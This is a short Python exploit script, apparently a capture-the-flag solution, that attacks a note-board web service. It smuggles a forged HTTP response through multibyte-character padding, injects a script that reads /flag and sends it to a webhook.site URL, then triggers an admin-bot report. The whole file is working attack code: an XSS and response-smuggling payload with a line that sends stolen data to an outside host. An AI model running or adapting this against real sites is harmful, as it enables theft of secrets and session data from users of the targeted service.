import json
import requests

server_url = "http://35.224.135.84"

html = "<script>fetch('/flag').then(r=>r.text()).then(r=>location='https://webhook.site/fc2cf5c6-0c4b-46b2-81ba-c2b2a8fdd3cb/?flag='+encodeURIComponent(r))</script>"
payload = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(html)}\r\n\r\n{html}"

# À is 2 bytes
wrapped = "À" * 724 * 8 + payload + "x" * (724 * 8 - len(payload))
assert len(wrapped) == 724 * 8 * 2
assert wrapped.encode()[len(wrapped) :].decode().startswith(payload)

garbage = "x" * 20480

resp = requests.get(f"{server_url}:3100/create_board", allow_redirects=False)
id = resp.headers["location"].split("/")[-1]


def add_note(id, body):
    requests.post(
        f"{server_url}:3100/board/add_note", json={"id": id, "body": body}
    )


add_note(id, wrapped)
add_note(id, garbage)
add_note(id, garbage)
add_note(id, garbage)
add_note(id, garbage)
add_note(id, garbage)
add_note(id, "trigger")
print(f"{server_url}:3100/board/{id}")

from pwn import remote

r = remote("35.224.135.84", 3101)
r.send(f"GET /{id}/note0\n\n")
r.recvuntil(b"\r\n\r\n")
print("sancheck", r.recvall(timeout=2).decode() == wrapped)

try:
    requests.get(f"{server_url}:3100/board/{id}/report", timeout=10)
except:
    pass

print("done")
